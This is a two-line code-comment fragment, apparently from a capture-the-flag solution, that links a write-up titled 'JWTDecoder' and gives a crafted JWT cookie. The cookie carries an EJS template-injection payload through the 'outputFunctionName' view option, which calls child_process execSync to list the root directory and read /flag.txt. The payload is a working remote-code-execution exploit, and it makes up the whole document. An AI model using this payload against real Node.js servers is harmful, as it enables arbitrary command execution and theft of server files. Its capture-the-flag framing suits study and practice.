...
// https://hackmd.io/@sqrtrev/Hy3kyZMyj#JWTDecoder
// Cookie: jwt=j:{"settings":{"view options":{"outputFunctionName":"x%3b__output%2b%3dprocess.mainModule.require('child_process').execSync('ls -al / %26%26 cat /flag.txt').toString()%3bx"}}};